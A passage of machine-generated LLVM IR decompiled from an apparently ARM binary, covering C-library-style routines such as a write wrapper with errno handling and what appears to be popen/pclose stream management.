  %v3_cbac = load i32, i32* @r2, align 4
  %v4_cbac = call i32 @write(i32 %arg1, i32* %arg2, i32 %v3_cbac)
  store i32 %v4_cbac, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v4_cbac, -4095
  br i1 %tmp, label %dec_label_pc_cbcc, label %dec_label_pc_cbbc

dec_label_pc_cbbc:                                ; preds = %dec_label_pc_cba8
  %v0_cbbc = call i32 @function_cc08()
  %v0_cbc0 = load i32, i32* %r4.global-to-local, align 4
  %v1_cbc0 = sub i32 0, %v0_cbc0
  %v2_cbc4 = inttoptr i32 %v0_cbbc to i32*
  store i32 %v1_cbc0, i32* %v2_cbc4, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_cbcc

dec_label_pc_cbcc:                                ; preds = %dec_label_pc_cba8, %dec_label_pc_cbbc
  %v0_cbcc = phi i32 [ %v4_cbac, %dec_label_pc_cba8 ], [ -1, %dec_label_pc_cbbc ]
  %v2_cbd0 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_cbd0, i32* @r4, align 4
  ret i32 %v0_cbcc

; uselistorder directives
  uselistorder i32 %v4_cbac, { 1, 0, 2 }
  uselistorder label %dec_label_pc_cbcc, { 1, 0 }
}

define i32 @function_cbd4(i32 %arg1) local_unnamed_addr {
dec_label_pc_cbd4:
  %v1_cbdc = icmp slt i32 %arg1, 0
  br i1 %v1_cbdc, label %bb, label %bb1

bb:                                               ; preds = %dec_label_pc_cbd4
  ret i32 %arg1

bb1:                                              ; preds = %dec_label_pc_cbd4
  %v2_cbdc = mul i32 %arg1, 2
  %v2_cbe8 = load i32, i32* @global_var_180f4, align 4
  %v2_cbec = add i32 %v2_cbe8, %v2_cbdc
  %v3_cbf0 = inttoptr i32 %v2_cbec to i8*
  %v4_cbf0 = load i8, i8* %v3_cbf0, align 1
  %v6_cbf0 = zext i8 %v4_cbf0 to i32
  %v1_cbf4 = add i32 %v2_cbec, 1
  %v2_cbf4 = inttoptr i32 %v1_cbf4 to i8*
  %v3_cbf4 = load i8, i8* %v2_cbf4, align 1
  %v4_cbf4 = zext i8 %v3_cbf4 to i32
  %v3_cbf8 = mul nuw i32 %v4_cbf4, 16777216
  %v4_cbfc = sdiv i32 %v3_cbf8, 65536
  %v5_cbfc = or i32 %v4_cbfc, %v6_cbf0
  ret i32 %v5_cbfc

; uselistorder directives
  uselistorder i32 %v2_cbec, { 1, 0 }
}

define i32 @function_cc08() local_unnamed_addr {
dec_label_pc_cc08:
  ret i32 ptrtoint (i32* @global_var_1aac8.268 to i32)
}

define i32 @function_cc14(i8* %arg1) local_unnamed_addr {
dec_label_pc_cc14:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r3.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-64 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v3_cc14 = load i32, i32* @r4, align 4
  store i32 %v3_cc14, i32* %stack_var_-32, align 4
  %v6_cc14 = load i32, i32* @r5, align 4
  %v9_cc14 = load i32, i32* @r6, align 4
  %v12_cc14 = load i32, i32* @r7, align 4
  %v15_cc14 = load i32, i32* @r8, align 4
  %v2_cc18 = add i32 %tmp, 52
  %v3_cc18 = inttoptr i32 %v2_cc18 to i32*
  %v4_cc18 = load i32, i32* %v3_cc18, align 4
  store i32 %v4_cc18, i32* @r8, align 4
  %v2_cc1c = add i32 %tmp, 56
  store i32 %v2_cc1c, i32* @r5, align 4
  %v2_cc20 = ptrtoint i32* %stack_var_-64 to i32
  %v2_cc24 = icmp eq i32 %v4_cc18, 0
  store i1 %v2_cc24, i1* %cpsr_z.global-to-local, align 1
  store i32 %tmp, i32* @r4, align 4
  %v2_cc34 = ptrtoint i32* %stack_var_-48 to i32
  store i32 %v2_cc34, i32* @r0, align 4
  br i1 %v2_cc24, label %dec_label_pc_cc3c, label %dec_label_pc_cc58

dec_label_pc_cc3c:                                ; preds = %dec_label_pc_cc14
  store i32 67648, i32* %r3.global-to-local, align 4
  %v1_cc44 = call i32 @function_10840()
  store i32 ptrtoint (i8* @global_var_10838.270 to i32), i32* %r3.global-to-local, align 4
  %v1_cc54 = call i32 @function_10838()
  %v0_cc58.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_cc58

dec_label_pc_cc58:                                ; preds = %dec_label_pc_cc14, %dec_label_pc_cc3c
  %v0_cc60 = phi i32 [ %tmp, %dec_label_pc_cc14 ], [ %v0_cc58.pre, %dec_label_pc_cc3c ]
  %v1_cc58 = inttoptr i32 %v0_cc60 to i8*
  %v2_cc58 = load i8, i8* %v1_cc58, align 1
  %v3_cc58 = zext i8 %v2_cc58 to i32
  %v1_cc5c = and i32 %v3_cc58, 64
  store i32 %v1_cc5c, i32* %r3.global-to-local, align 4
  %v2_cc5c = icmp eq i32 %v1_cc5c, 0
  store i1 %v2_cc5c, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_cc5c, i32* @r7, align 4
  br i1 %v2_cc5c, label %dec_label_pc_cc74, label %dec_label_pc_cc6c

dec_label_pc_cc6c:                                ; preds = %dec_label_pc_cc58
  %v3_cc6c = call i32 @function_e7a0(i8* %v1_cc58)
  store i32 %v3_cc6c, i32* @r7, align 4
  %v0_cc74.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_cc74

dec_label_pc_cc74:                                ; preds = %dec_label_pc_cc58, %dec_label_pc_cc6c
  %v0_cc74 = phi i32 [ %v0_cc60, %dec_label_pc_cc58 ], [ %v0_cc74.pre, %dec_label_pc_cc6c ]
  %v1_cc74 = add i32 %v0_cc74, 4
  %v2_cc74 = inttoptr i32 %v1_cc74 to i32*
  %v3_cc74 = load i32, i32* %v2_cc74, align 4
  %v1_cc78 = call i32 @function_ca18(i32 %v3_cc74)
  store i32 -1, i32* %r3.global-to-local, align 4
  %v1_cc80 = icmp slt i32 %v1_cc78, 0
  %v2_cc80 = icmp eq i32 %v1_cc78, 0
  store i1 %v2_cc80, i1* %cpsr_z.global-to-local, align 1
  %v1_cc84 = load i32, i32* @r4, align 4
  %v2_cc84 = add i32 %v1_cc84, 4
  %v3_cc84 = inttoptr i32 %v2_cc84 to i32*
  store i32 -1, i32* %v3_cc84, align 4
  store i32 %v2_cc20, i32* @r0, align 4
  br i1 %v1_cc80, label %bb, label %bb15

bb:                                               ; preds = %dec_label_pc_cc74
  %v3_cc98 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v3_cc98, i32* @r7, align 4
  br label %bb15

bb15:                                             ; preds = %dec_label_pc_cc74, %bb
  %v1_cca4 = call i32 @function_10840()
  %v1_ccb0 = call i32 @function_10838()
  %v2_ccb8 = load i32, i32* @global_var_188a4.276, align 4
  %v1_ccbc = add i32 %v2_ccb8, 1
  store i32 %v1_ccbc, i32* %r3.global-to-local, align 4
  store i32 %v1_ccbc, i32* @global_var_188a4.276, align 4
  store i32 %v2_cc20, i32* @r0, align 4
  %v1_ccd4 = call i32 @function_10840()
  %v0_ccd8 = load i32, i32* @r4, align 4
  %v1_ccd8 = inttoptr i32 %v0_ccd8 to i32*
  %v2_ccd8 = load i32, i32* %v1_ccd8, align 4
  %v1_ccdc = and i32 %v2_ccd8, 24576
  store i32 %v1_ccdc, i32* %r3.global-to-local, align 4
  %v3_cce01 = udiv i32 %v1_ccdc, 256
  %v1_cce4 = trunc i32 %v3_cce01 to i8
  %v3_cce4 = add i32 %v0_ccd8, 1
  %v4_cce4 = inttoptr i32 %v3_cce4 to i8*
  store i8 %v1_cce4, i8* %v4_cce4, align 1
  %v0_cce8 = load i32, i32* %r3.global-to-local, align 4
  %v1_cce8 = trunc i32 %v0_cce8 to i8
  %v2_cce8 = load i32, i32* @r4, align 4
  %v3_cce8 = inttoptr i32 %v2_cce8 to i8*
  store i8 %v1_cce8, i8* %v3_cce8, align 1
  %v0_ccec = load i32, i32* @r4, align 4
  %v1_ccec = inttoptr i32 %v0_ccec to i32*
  %v2_ccec = load i32, i32* %v1_ccec, align 4
  %v1_ccf0 = or i32 %v2_ccec, 48
  store i32 %v1_ccf0, i32* %r3.global-to-local, align 4
  %v3_ccf4 = sdiv i32 %v2_ccec, 256
  %v0_ccf8 = load i32, i32* @r8, align 4
  %v2_ccf8 = icmp eq i32 %v0_ccf8, 0
  store i1 %v2_ccf8, i1* %cpsr_z.global-to-local, align 1
  store i32 %v2_cc34, i32* @r0, align 4
  %v1_cd08 = trunc i32 %v3_ccf4 to i8
  %v3_cd08 = add i32 %v0_ccec, 1
  %v4_cd08 = inttoptr i32 %v3_cd08 to i8*
  store i8 %v1_cd08, i8* %v4_cd08, align 1
  %v0_cd0c = load i32, i32* %r3.global-to-local, align 4
  %v1_cd0c = trunc i32 %v0_cd0c to i8
  %v2_cd0c = load i32, i32* @r4, align 4
  %v3_cd0c = inttoptr i32 %v2_cd0c to i8*
  store i8 %v1_cd0c, i8* %v3_cd0c, align 1
  %v0_cd10 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_cd10, label %bb16, label %.thread

bb16:                                             ; preds = %bb15
  %v2_cd14 = call i32 @function_10840()
  br label %.thread

.thread:                                          ; preds = %bb15, %bb16
  %v0_cd18 = load i32, i32* @r4, align 4
  %v1_cd18 = add i32 %v0_cd18, 1
  %v2_cd18 = inttoptr i32 %v1_cd18 to i8*
  %v3_cd18 = load i8, i8* %v2_cd18, align 1
  %v4_cd18 = zext i8 %v3_cd18 to i32
  store i32 %v4_cd18, i32* %r3.global-to-local, align 4
  %v1_cd1c = and i32 %v4_cd18, 64
  %v2_cd1c = icmp eq i32 %v1_cd1c, 0
  store i1 %v2_cd1c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_cd1c, label %bb18, label %bb17

bb17:                                             ; preds = %.thread
  br label %bb18

bb18:                                             ; preds = %.thread, %bb17
  %v1_cd24 = xor i1 %v2_cd1c, true
  call void @__pseudo_cond_branch(i1 %v1_cd24, i32 ptrtoint (i32* @global_var_fa5c.278 to i32))
  store i32 %v2_cc20, i32* @r0, align 4
  %v1_cd38 = call i32 @function_10840()
  %v1_cd44 = call i32 @function_10838()
  %v2_cd4c = load i32, i32* @global_var_188a8.281, align 4
  %v1_cd50 = add i32 %v2_cd4c, 1
  store i32 %v1_cd50, i32* %r3.global-to-local, align 4
  store i32 %v2_cc20, i32* @r0, align 4
  store i32 %v1_cd50, i32* @global_var_188a8.281, align 4
  %v1_cd64 = call i32 @function_10840()
  %v1_cd68 = call i32 @function_e660(i32 %v1_cd64)
  %v0_cd6c = load i32, i32* @r7, align 4
  %v2_cd74 = load i32, i32* %stack_var_-32, align 4
  store i32 %v2_cd74, i32* @r4, align 4
  store i32 %v6_cc14, i32* @r5, align 4
  store i32 %v9_cc14, i32* @r6, align 4
  store i32 %v12_cc14, i32* @r7, align 4
  store i32 %v15_cc14, i32* @r8, align 4
  ret i32 %v0_cd6c

; uselistorder directives
  uselistorder i32 %tmp, { 0, 1, 3, 2 }
  uselistorder label %bb18, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
  uselistorder label %bb15, { 1, 0 }
  uselistorder label %dec_label_pc_cc74, { 1, 0 }
  uselistorder label %dec_label_pc_cc58, { 1, 0 }
}

define i32 @function_cd94(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_cd94:
  %v0_cd9c = load i32, i32* @r0, align 4
  %v1_cd9c = load i32, i32* @r1, align 4
  %v4_cd9c = inttoptr i32 %v1_cd9c to i8*
  %v5_cd9c = call i32 @function_d1dc(i32 %v0_cd9c, i8* %v4_cd9c, i32 0, i32 -1)
  ret i32 %v5_cd9c
}

define i32 @function_cda0(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_cda0:
  store i32 %arg2, i32* @r3, align 4
  store i32 %arg1, i32* @r2, align 4
  store i32 -1, i32* @r1, align 4
  %v0_cdac = call i32 @function_cde4()
  ret i32 %v0_cdac
}

define i32 @function_cdb0(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_cdb0:
  %stack_var_-8 = alloca i32, align 4
  store i32 %arg2, i32* %stack_var_-8, align 4
  %v2_cdbc = ptrtoint i32* %stack_var_-8 to i32
  store i32 %v2_cdbc, i32* @r3, align 4
  store i32 -1, i32* @r1, align 4
  store i32 %arg1, i32* @r2, align 4
  %v0_cdd0 = call i32 @function_cde4()
  ret i32 %v0_cdd0

; uselistorder directives
  uselistorder i32* %stack_var_-8, { 1, 0 }
}

define i32 @function_cde4() local_unnamed_addr {
dec_label_pc_cde4:
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-108 = alloca i32, align 4
  %v3_cde4 = load i32, i32* @r4, align 4
  %v6_cde4 = load i32, i32* @r5, align 4
  %v12_cde4 = load i32, i32* @r7, align 4
  %v15_cde4 = load i32, i32* @r8, align 4
  %v18_cde4 = load i32, i32* @sl, align 4
  %v0_cde8 = load i32, i32* @r3, align 4
  store i32 %v0_cde8, i32* @r8, align 4
  %v2_cdec = ptrtoint i32* %stack_var_-108 to i32
  %v0_cdf4 = load i32, i32* @r0, align 4
  %v1_cdf4 = sub i32 -1, %v0_cdf4
  store i32 %v1_cdf4, i32* @r5, align 4
  store i32 %v0_cdf4, i32* @r4, align 4
  store i32 0, i32* @sl, align 4
  %v1_ce08 = load i32, i32* @r1, align 4
  %v3_ce08 = icmp ult i32 %v1_cdf4, %v1_ce08
  br i1 %v3_ce08, label %bb23, label %bb

bb:                                               ; preds = %dec_label_pc_cde4
  store i32 %v1_ce08, i32* @r5, align 4
  br label %bb23

bb23:                                             ; preds = %dec_label_pc_cde4, %bb
  %v0_ce10 = load i32, i32* @r2, align 4
  store i32 %v0_ce10, i32* @r7, align 4
  %v2_ce14 = ptrtoint i32* %stack_var_-52 to i32
  store i32 %v2_ce14, i32* @r0, align 4
  store i32 208, i32* %stack_var_-108, align 4
  %v0_ce30 = call i32 @function_d544()
  %v0_ce34 = load i32, i32* @r4, align 4
  %v1_ce34 = load i32, i32* @r5, align 4
  %v2_ce34 = add i32 %v1_ce34, %v0_ce34
  %v0_ce3c = load i32, i32* @r7, align 4
  %v0_ce40 = load i32, i32* @r8, align 4
  %v0_ce4c = load i32, i32* @sl, align 4
  %v12_ce60 = inttoptr i32 %v0_ce3c to i8*
  %v13_ce60 = call i32 @function_d70c(i32 %v2_cdec, i8* %v12_ce60, i32 %v0_ce40, i32 %v2_ce34, i32 %v0_ce34, i32 %v2_ce34, i32 %v0_ce34, i32 %v0_ce34, i32 %v0_ce34, i32 %v2_ce34, i32 %v0_ce4c)
  %v0_ce64 = load i32, i32* @r5, align 4
  %v1_ce64 = load i32, i32* @sl, align 4
  %v9_ce64 = icmp eq i32 %v0_ce64, %v1_ce64
  br i1 %v9_ce64, label %dec_label_pc_ce8c, label %dec_label_pc_ce70

dec_label_pc_ce70:                                ; preds = %bb23
  %v9_ce78 = icmp eq i32 %v1_ce34, 0
  %v1_ce7c = sext i1 %v9_ce78 to i32
  %v1_ce7c.v0_ce44 = add i32 %v0_ce34, %v1_ce7c
  %stack_var_-92.0 = inttoptr i32 %v1_ce7c.v0_ce44 to i8*
  %v1_ce88 = trunc i32 %v1_ce64 to i8
  store i8 %v1_ce88, i8* %stack_var_-92.0, align 1
  br label %dec_label_pc_ce8c

dec_label_pc_ce8c:                                ; preds = %bb23, %dec_label_pc_ce70
  store i32 %v3_cde4, i32* @r4, align 4
  store i32 %v6_cde4, i32* @r5, align 4
  store i32 %v12_cde4, i32* @r7, align 4
  store i32 %v15_cde4, i32* @r8, align 4
  store i32 %v18_cde4, i32* @sl, align 4
  ret i32 %v13_ce60

; uselistorder directives
  uselistorder i32 %v1_ce34, { 1, 0 }
  uselistorder i32 %v0_ce34, { 0, 3, 4, 5, 2, 1 }
  uselistorder i32 %v1_ce08, { 1, 0 }
  uselistorder i32 %v0_cdf4, { 1, 0 }
  uselistorder label %dec_label_pc_ce8c, { 1, 0 }
  uselistorder label %bb23, { 1, 0 }
}

define i32 @function_ce94(i32 %arg1) local_unnamed_addr {
dec_label_pc_ce94:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v3_ce94 = load i32, i32* @r4, align 4
  %v2_ce98 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %arg1, i32* @r5, align 4
  store i32 %v2_ce98, i32* @r0, align 4
  %v1_ceb4 = call i32 @function_10840()
  %v1_cec4 = call i32 @function_10838()
  %v2_cecc = load i32, i32* @global_var_188a0.288, align 4
  store i32 %v2_cecc, i32* %r4.global-to-local, align 4
  %v2_ced0 = icmp eq i32 %v2_cecc, 0
  br i1 %v2_ced0, label %dec_label_pc_cf18, label %dec_label_pc_cf04.preheader

dec_label_pc_cf04.preheader:                      ; preds = %dec_label_pc_ce94
  %v1_cf08.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_cf04

dec_label_pc_cedc:                                ; preds = %dec_label_pc_cef4
  %v0_cedc = call i32 @function_cc08()
  %v2_cee4 = inttoptr i32 %v0_cedc to i32*
  store i32 22, i32* %v2_cee4, align 4
  br label %dec_label_pc_cf18

dec_label_pc_ceec:                                ; preds = %dec_label_pc_cf48
  %v3_ceec = load i32, i32* %stack_var_-16, align 4
  br label %dec_label_pc_cf74

dec_label_pc_cef4:                                ; preds = %dec_label_pc_cf04
  %v1_cef8 = inttoptr i32 %v0_cf10 to i32*
  %v2_cef8 = load i32, i32* %v1_cef8, align 4
  store i32 %v2_cef8, i32* %r4.global-to-local, align 4
  %v2_cefc = icmp eq i32 %v2_cef8, 0
  br i1 %v2_cefc, label %dec_label_pc_cedc, label %dec_label_pc_cf04

dec_label_pc_cf04:                                ; preds = %dec_label_pc_cf04.preheader, %dec_label_pc_cef4
  %v1_cf14 = phi i32 [ ptrtoint (i32* @global_var_188a0.288 to i32), %dec_label_pc_cf04.preheader ], [ %v0_cf10, %dec_label_pc_cef4 ]
  %v0_cf10 = phi i32 [ %v2_cecc, %dec_label_pc_cf04.preheader ], [ %v2_cef8, %dec_label_pc_cef4 ]
  %v1_cf04 = add i32 %v0_cf10, 4
  %v2_cf04 = inttoptr i32 %v1_cf04 to i32*
  %v3_cf04 = load i32, i32* %v2_cf04, align 4
  %v9_cf08 = icmp eq i32 %v3_cf04, %v1_cf08.pre
  br i1 %v9_cf08, label %dec_label_pc_cf10, label %dec_label_pc_cef4

dec_label_pc_cf10:                                ; preds = %dec_label_pc_cf04
  %v1_cf10 = inttoptr i32 %v0_cf10 to i32*
  %v2_cf10 = load i32, i32* %v1_cf10, align 4
  %v2_cf14 = inttoptr i32 %v1_cf14 to i32*
  store i32 %v2_cf10, i32* %v2_cf14, align 4
  br label %dec_label_pc_cf18

dec_label_pc_cf18:                                ; preds = %dec_label_pc_ce94, %dec_label_pc_cedc, %dec_label_pc_cf10
  store i32 %v2_ce98, i32* @r0, align 4
  store i32 53036, i32* @lr, align 4
  %v1_cf28 = call i32 @function_10840()
  %v0_cf2c = load i32, i32* %r4.global-to-local, align 4
  %v2_cf2c = icmp eq i32 %v0_cf2c, 0
  br i1 %v2_cf2c, label %dec_label_pc_cf74, label %dec_label_pc_cf34

dec_label_pc_cf34:                                ; preds = %dec_label_pc_cf18
  %v1_cf38 = add i32 %v0_cf2c, 8
  %v2_cf38 = inttoptr i32 %v1_cf38 to i32*
  %v3_cf38 = load i32, i32* %v2_cf38, align 4
  store i32 %v3_cf38, i32* @r4, align 4
  %v1_cf3c = call i32 @function_fa5c(i32 %v0_cf2c)
  %v0_cf40 = load i32, i32* @r5, align 4
  %v1_cf44 = inttoptr i32 %v0_cf40 to i8*
  %v2_cf44 = call i32 @function_cc14(i8* %v1_cf44)
  %v2_cf48 = ptrtoint i32* %stack_var_-16 to i32
  br label %dec_label_pc_cf48

dec_label_pc_cf48:                                ; preds = %dec_label_pc_cf60, %dec_label_pc_cf34
  store i32 %v2_cf48, i32* @r1, align 4
  store i32 0, i32* @r2, align 4
  %v0_cf50 = load i32, i32* @r4, align 4
  store i32 %v0_cf50, i32* @r0, align 4
  %v3_cf54 = call i32 @function_cba0(i32 %v0_cf50, i32 %v2_cf48, i32 0)
  %v1_cf58 = icmp slt i32 %v3_cf54, 0
  br i1 %v1_cf58, label %dec_label_pc_cf60, label %dec_label_pc_ceec

dec_label_pc_cf60:                                ; preds = %dec_label_pc_cf48
  %v0_cf60 = call i32 @function_cc08()
  %v1_cf64 = inttoptr i32 %v0_cf60 to i32*
  %v2_cf64 = load i32, i32* %v1_cf64, align 4
  %v7_cf68 = icmp eq i32 %v2_cf64, 4
  br i1 %v7_cf68, label %dec_label_pc_cf48, label %dec_label_pc_cf74

dec_label_pc_cf74:                                ; preds = %dec_label_pc_cf60, %dec_label_pc_cf18, %dec_label_pc_ceec
  %storemerge = phi i32 [ %v3_ceec, %dec_label_pc_ceec ], [ -1, %dec_label_pc_cf18 ], [ -1, %dec_label_pc_cf60 ]
  store i32 %v3_ce94, i32* %r4.global-to-local, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v0_cf2c, { 1, 0, 2 }
  uselistorder i32 %v0_cf10, { 0, 3, 2, 1 }
  uselistorder i32* %stack_var_-16, { 1, 0 }
  uselistorder i32* %r4.global-to-local, { 0, 2, 1, 3 }
  uselistorder i32 (i32, i32, i32)* @function_cba0, { 1, 0 }
  uselistorder label %dec_label_pc_cf18, { 2, 1, 0 }
  uselistorder label %dec_label_pc_cf04, { 1, 0 }
}

define i32 @function_cf94(i32 %arg1, i8* %arg2) local_unnamed_addr {
dec_label_pc_cf94:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg2 to i32
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %stack_var_-20 = alloca i32, align 4
  %v3_cf94 = load i32, i32* @r4, align 4
  store i32 %v3_cf94, i32* %stack_var_-20, align 4
  %v16_cf94 = ptrtoint i32* %stack_var_-20 to i32
  %v3_cf98 = load i8, i8* %arg2, align 1
  %v4_cf98 = zext i8 %v3_cf98 to i32
  store i32 %v4_cf98, i32* %r3.global-to-local, align 4
  %v7_cfa0 = icmp eq i8 %v3_cf98, 119
  store i32 %tmp, i32* @r4, align 4
  %v0_cfa8 = load i32, i32* %r0.global-to-local, align 4
  br i1 %v7_cfa0, label %dec_label_pc_cfd8, label %dec_label_pc_cfb0

dec_label_pc_cfb0:                                ; preds = %dec_label_pc_cf94
  %v7_cfb0 = icmp eq i8 %v3_cf98, 114
  br i1 %v7_cfb0, label %bb, label %dec_label_pc_cfc0

bb:                                               ; preds = %dec_label_pc_cfb0
  store i32 1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_cfe0

dec_label_pc_cfc0:                                ; preds = %dec_label_pc_cfb0
  %v0_cfc0 = call i32 @function_cc08()
  store i32 %v0_cfc0, i32* %r0.global-to-local, align 4
  store i32 22, i32* %r3.global-to-local, align 4
  %v2_cfd0 = inttoptr i32 %v0_cfc0 to i32*
  store i32 22, i32* %v2_cfd0, align 4
  br label %dec_label_pc_d1ac

dec_label_pc_cfd8:                                ; preds = %dec_label_pc_cf94
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_cfe0

dec_label_pc_cfe0:                                ; preds = %bb, %dec_label_pc_cfd8
  %v0_d0ac = phi i32 [ 0, %dec_label_pc_cfd8 ], [ 1, %bb ]
  store i32 12, i32* %r0.global-to-local, align 4
  %v1_cfe4 = call i32 @function_f908(i32 12)
  store i32 %v1_cfe4, i32* %r0.global-to-local, align 4
  %v2_cfe8 = icmp eq i32 %v1_cfe4, 0
  br i1 %v2_cfe8, label %dec_label_pc_d1ac, label %dec_label_pc_cff8

dec_label_pc_cff8:                                ; preds = %dec_label_pc_cfe0
  %v2_cff8 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_cff8, i32* %r0.global-to-local, align 4
  %v1_cffc = call i32 @function_10f00(i32 %v2_cff8)
  store i32 %v1_cffc, i32* %r0.global-to-local, align 4
  %v2_d000 = icmp eq i32 %v1_cffc, 0
  br i1 %v2_d000, label %dec_label_pc_d008, label %dec_label_pc_d19c

dec_label_pc_d008:                                ; preds = %dec_label_pc_cff8
  store i32 %v16_cf94, i32* %r0.global-to-local, align 4
  %v1_d010 = xor i32 %v0_d0ac, 1
  store i32 -8, i32* @r2, align 4
  %tmp23 = sub nsw i32 0, %v1_d010
  %v4_d018 = and i32 %tmp23, 4
  %v5_d018 = add i32 %v4_d018, %v16_cf94
  store i32 %v5_d018, i32* %r3.global-to-local, align 4
  %v2_d01c = add i32 %v5_d018, -8
  %v3_d01c = inttoptr i32 %v2_d01c to i32*
  %v4_d01c = load i32, i32* %v3_d01c, align 4
  %tmp24 = sub nsw i32 0, %v0_d0ac
  %v4_d024 = and i32 %tmp24, 4
  %v5_d024 = add i32 %v4_d024, %v16_cf94
  store i32 %v5_d024, i32* %r3.global-to-local, align 4
  %v2_d028 = add i32 %v5_d024, -8
  %v3_d028 = inttoptr i32 %v2_d028 to i32*
  %v4_d028 = load i32, i32* %v3_d028, align 4
  store i32 %v4_d028, i32* %r3.global-to-local, align 4
  %v0_d02c = load i32, i32* @r4, align 4
  store i32 %v4_d01c, i32* %r0.global-to-local, align 4
  %v7_d038 = call i32 @function_1113c(i32 %v4_d01c, i32 %v0_d02c, i32 -8, i32 %v4_d028, i32 %v4_d01c, i32 %v4_d028)
  store i32 %v7_d038, i32* %r0.global-to-local, align 4
  %v2_d03c = icmp eq i32 %v7_d038, 0
  br i1 %v2_d03c, label %dec_label_pc_d048, label %dec_label_pc_d05c

dec_label_pc_d048:                                ; preds = %dec_label_pc_d008
  store i32 %v4_d01c, i32* %r0.global-to-local, align 4
  %v1_d04c = call i32 @function_ca18(i32 %v4_d01c)
  store i32 %v4_d028, i32* %r0.global-to-local, align 4
  %v1_d054 = call i32 @function_ca18(i32 %v4_d028)
  store i32 %v1_d054, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_d19c

dec_label_pc_d05c:                                ; preds = %dec_label_pc_d008
  store i32 ptrtoint (i32* @global_var_18888.283 to i32), i32* @r4, align 4
  store i32 ptrtoint (i32* @global_var_18888.283 to i32), i32* %r2.global-to-local, align 4
  %v2_d068 = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v2_d068, i32* @r0, align 4
  store i32 67648, i32* %r3.global-to-local, align 4
  %v1_d074 = call i32 @function_10840()
  %v0_d078 = load i32, i32* @r4, align 4
  store i32 %v0_d078, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i8* @global_var_10838.270 to i32), i32* %r3.global-to-local, align 4
  %v1_d084 = call i32 @function_10838()
  store i32 %v1_d084, i32* %r0.global-to-local, align 4
  %v1_d088 = call i32 @function_10c10(i32 %v1_d084)
  store i32 %v1_d088, i32* %r0.global-to-local, align 4
  store i32 %v1_d088, i32* @r5, align 4
  %v2_d08c = icmp eq i32 %v1_d088, 0
  br i1 %v2_d08c, label %dec_label_pc_d094, label %dec_label_pc_d104

dec_label_pc_d094:                                ; preds = %dec_label_pc_d05c
  store i32 %v4_d01c, i32* %r0.global-to-local, align 4
  %v1_d098 = call i32 @function_ca18(i32 %v4_d01c)
  store i32 %v1_d098, i32* %r0.global-to-local, align 4
  store i32 %v0_d0ac, i32* %r2.global-to-local, align 4
  %v9_d0a4 = icmp eq i32 %v4_d028, %v0_d0ac
  br i1 %v9_d0a4, label %dec_label_pc_d0c0, label %dec_label_pc_d0ac

dec_label_pc_d0ac:                                ; preds = %dec_label_pc_d094
  store i32 %v4_d028, i32* %r0.global-to-local, align 4
  %v2_d0b4 = call i32 @function_10d60(i32 %v4_d028, i32 %v0_d0ac)
  store i32 %v4_d028, i32* %r0.global-to-local, align 4
  %v1_d0bc = call i32 @function_ca18(i32 %v4_d028)
  store i32 %v1_d0bc, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_d0c0

dec_label_pc_d0c0:                                ; preds = %dec_label_pc_d094, %dec_label_pc_d0ac
  store i32 ptrtoint (i32* @global_var_188a0.288 to i32), i32* %r3.global-to-local, align 4
  %storemerge3 = load i32, i32* @global_var_188a0.288, align 4
  store i32 %storemerge3, i32* @r4, align 4
  %v2_d0dc5 = icmp eq i32 %storemerge3, 0
  br i1 %v2_d0dc5, label %dec_label_pc_d0e4, label %dec_label_pc_d0cc

dec_label_pc_d0cc:                                ; preds = %dec_label_pc_d0c0, %dec_label_pc_d0cc
  %v0_d0cc = phi i32 [ %storemerge, %dec_label_pc_d0cc ], [ %storemerge3, %dec_label_pc_d0c0 ]
  %v1_d0cc = add i32 %v0_d0cc, 4
  %v2_d0cc = inttoptr i32 %v1_d0cc to i32*
  %v3_d0cc = load i32, i32* %v2_d0cc, align 4
  store i32 %v3_d0cc, i32* %r3.global-to-local, align 4
  %v1_d0d0 = add i32 %v3_d0cc, 4
  %v2_d0d0 = inttoptr i32 %v1_d0d0 to i32*
  %v3_d0d0 = load i32, i32* %v2_d0d0, align 4
  store i32 %v3_d0d0, i32* %r0.global-to-local, align 4
  %v1_d0d4 = call i32 @function_ca18(i32 %v3_d0d0)
  store i32 %v1_d0d4, i32* %r0.global-to-local, align 4
  %v0_d0d8 = load i32, i32* @r4, align 4
  %v1_d0d8 = inttoptr i32 %v0_d0d8 to i32*
  %storemerge = load i32, i32* %v1_d0d8, align 4
  store i32 %storemerge, i32* @r4, align 4
  %v2_d0dc = icmp eq i32 %storemerge, 0
  br i1 %v2_d0dc, label %dec_label_pc_d0e4, label %dec_label_pc_d0cc

